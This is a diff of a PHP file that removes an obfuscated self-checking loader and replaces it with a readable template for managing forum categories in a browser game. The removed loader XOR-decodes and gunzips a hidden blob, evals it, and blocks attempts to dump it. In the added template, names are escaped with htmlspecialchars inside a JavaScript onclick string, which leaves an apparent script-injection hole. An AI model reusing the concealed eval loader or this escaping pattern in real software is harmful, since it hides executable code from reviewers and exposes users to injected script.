@@ -1,24 +1,160 @@
 <?php
-$fmydzjr="0eeec723a4ee22a82b2e668eaa5e3e9a";
-$eggpgzvzcg="075500500205575159555c060b06500c0b5a53520e025e035900545d04045d02";
-$ldrmmsye="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";
-$gnkhyqante=file_get_contents(__FILE__);
-$cseagkub=str_replace($ldrmmsye,"",$gnkhyqante);
-if(strpos($cseagkub,"ec"."ho")!==false||strpos($cseagkub,"pr"."int")!==false||strpos($cseagkub,"var_"."dump")!==false||strpos($cseagkub,"file_put_"."contents")!==false||strpos($cseagkub,"fw"."rite")!==false){die();}
-$bkbspahjexh=str_replace(array($fmydzjr,$eggpgzvzcg),array("SP_c17fd0fe","KP_a862caa9"),$gnkhyqante);
-$rzpvhtvcp=md5($bkbspahjexh);
-$nshkggbpva=hex2bin($eggpgzvzcg);
-$ethfijqxf="";
-$omqaaudsp=strlen($rzpvhtvcp);
-for($iqockpaea=0;$iqockpaea<$omqaaudsp;$iqockpaea++){
-$ethfijqxf.=chr(ord($nshkggbpva[$iqockpaea])^ord($rzpvhtvcp[$iqockpaea]));
+/**
+ * Manage Forum Categories — screen=ally&mode=forum&action=manage_categories
+ */
+$baseUrl = 'game.php?village=' . $village['id'] . '&screen=ally&mode=forum';
+?>
+
+<h2><?= __('screens.ally_forum.manage_categories') ?></h2>
+
+<div style="margin-bottom: 10px;">
+    <a href="<?= $baseUrl ?>" class="btn">
+        « <?= __('screens.ally_forum.back_to_forum') ?>
+    </a>
+</div>
+
+<?php if (!empty($error)): ?>
+    <div class="error" style="padding: 10px; background-color: #ffdddd; border: 1px solid #ff0000; margin-bottom: 10px;">
+        <?= htmlspecialchars($error) ?>
+    </div>
+<?php endif; ?>
+
+<?php if (!empty($success)): ?>
+    <div class="success" style="padding: 10px; background-color: #ddffdd; border: 1px solid #00aa00; margin-bottom: 10px;">
+        <?= htmlspecialchars($success) ?>
+    </div>
+<?php endif; ?>
+
+<!-- Create New Category -->
+<table class="vis" width="100%" style="margin-bottom: 20px;">
+    <tr>
+        <th colspan="2"><?= __('screens.ally_forum.create_category') ?></th>
+    </tr>
+    <tr>
+        <td colspan="2">
+            <form action="<?= $baseUrl ?>&action=create_category&h=<?= $session['hkey'] ?>" method="POST">
+                <table width="100%">
+                    <tr>
+                        <td width="200"><b><?= __('screens.ally_forum.category_name') ?>:</b></td>
+                        <td><input type="text" name="name" required style="width: 300px;" maxlength="50"></td>
+                    </tr>
+                    <tr>
+                        <td><b><?= __('screens.ally_forum.category_description') ?>:</b></td>
+                        <td><input type="text" name="description" style="width: 500px;" maxlength="200"></td>
+                    </tr>
+                    <tr>
+                        <td colspan="2" align="center">
+                            <input type="submit" value="<?= __('screens.ally_forum.create_category') ?>" class="btn">
+                        </td>
+                    </tr>
+                </table>
+            </form>
+        </td>
+    </tr>
+</table>
+
+<!-- Existing Categories -->
+<table class="vis" width="100%">
+    <tr>
+        <th colspan="5"><?= __('screens.ally_forum.categories') ?></th>
+    </tr>
+    <tr>
+        <th width="50"><?= __('screens.ally_forum.category_icon') ?></th>
+        <th><?= __('screens.ally_forum.category_name') ?></th>
+        <th><?= __('screens.ally_forum.category_description') ?></th>
+        <th width="100"><?= __('screens.ally_forum.threads') ?></th>
+        <th width="200"><?= __('screens.ally_forum.actions') ?></th>
+    </tr>
+
+    <?php if (empty($sections)): ?>
+        <tr>
+            <td colspan="5" align="center" style="padding: 20px;">
+                <i><?= __('screens.ally_forum.no_categories') ?></i>
+            </td>
+        </tr>
+    <?php else: ?>
+        <?php foreach ($sections as $sec): ?>
+            <tr class="row_b">
+                <td align="center" style="font-size: 24px;">
+                    <?= htmlspecialchars($sec['icon'] ?? '') ?>
+                </td>
+                <td>
+                    <strong><?= htmlspecialchars($sec['name']) ?></strong>
+                </td>
+                <td>
+                    <?= htmlspecialchars($sec['description'] ?? '') ?>
+                </td>
+                <td align="center">
+                    <?php
+                    $count = $db->fetch(
+                        "SELECT COUNT(*) as count FROM ally_forum_threads WHERE section_id = ?",
+                        [$sec['id']]
+                    );
+                    echo $count['count'] ?? 0;
+                    ?>
+                </td>
+                <td align="center">
+                    <a href="javascript:void(0)"
+                       onclick="editCategory(<?= $sec['id'] ?>, '<?= htmlspecialchars($sec['name'], ENT_QUOTES) ?>', '<?= htmlspecialchars($sec['description'] ?? '', ENT_QUOTES) ?>')"
+                       class="btn">
+                        ✏️ <?= __('screens.ally_forum.edit') ?>
+                    </a>
+                    <a href="<?= $baseUrl ?>&action=delete_category&section_id=<?= $sec['id'] ?>&h=<?= $session['hkey'] ?>"
+                       onclick="return confirm('<?= __('screens.ally_forum.confirm_delete_category') ?>')" class="btn">
+                        🗑️ <?= __('screens.ally_forum.delete') ?>
+                    </a>
+                </td>
+            </tr>
+        <?php endforeach; ?>
+    <?php endif; ?>
+</table>
+
+<!-- Edit Category Modal -->
+<div id="edit_modal"
+     style="display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
+            background: white; border: 2px solid #c0a070; padding: 20px; z-index: 1000;
+            box-shadow: 0 0 20px rgba(0,0,0,0.5);">
+    <h3><?= __('screens.ally_forum.edit_category') ?></h3>
+    <form id="edit_form" action="<?= $baseUrl ?>&action=edit_category&h=<?= $session['hkey'] ?>" method="POST">
+        <input type="hidden" name="section_id" id="edit_section_id">
+        <table>
+            <tr>
+                <td><b><?= __('screens.ally_forum.category_name') ?>:</b></td>
+                <td><input type="text" name="name" id="edit_name" required style="width: 300px;" maxlength="50"></td>
+            </tr>
+            <tr>
+                <td><b><?= __('screens.ally_forum.category_description') ?>:</b></td>
+                <td><input type="text" name="description" id="edit_description" style="width: 400px;" maxlength="200"></td>
+            </tr>
+            <tr>
+                <td colspan="2" align="center">
+                    <input type="submit" value="<?= __('screens.ally_forum.save') ?>" class="btn">
+                    <button type="button" onclick="closeEditModal()" class="btn">
+                        <?= __('screens.ally_forum.cancel') ?>
+                    </button>
+                </td>
+            </tr>
+        </table>
+    </form>
+</div>
+
+<!-- Modal Overlay -->
+<div id="modal_overlay"
+     style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.5); z-index: 999;"
+     onclick="closeEditModal()"></div>
+
+<script>
+function editCategory(id, name, description) {
+    document.getElementById('edit_section_id').value = id;
+    document.getElementById('edit_name').value = name;
+    document.getElementById('edit_description').value = description;
+    document.getElementById('edit_modal').style.display = 'block';
+    document.getElementById('modal_overlay').style.display = 'block';
 }
-$ynhtpwd=base64_decode($ldrmmsye);
-$plwmarwgx=strlen($ynhtpwd);
-$ooovxpny="";
-$rsejrqw=strlen($ethfijqxf);
-for($iqockpaea=0;$iqockpaea<$plwmarwgx;$iqockpaea++){
-$ooovxpny.=$ynhtpwd[$iqockpaea]^$ethfijqxf[$iqockpaea%$rsejrqw];
+
+function closeEditModal() {
+    document.getElementById('edit_modal').style.display = 'none';
+    document.getElementById('modal_overlay').style.display = 'none';
 }
-$muxuaqszor="gzun"."compress";
-eval('?>' . $muxuaqszor($ooovxpny) . '<?php ');
+</script>
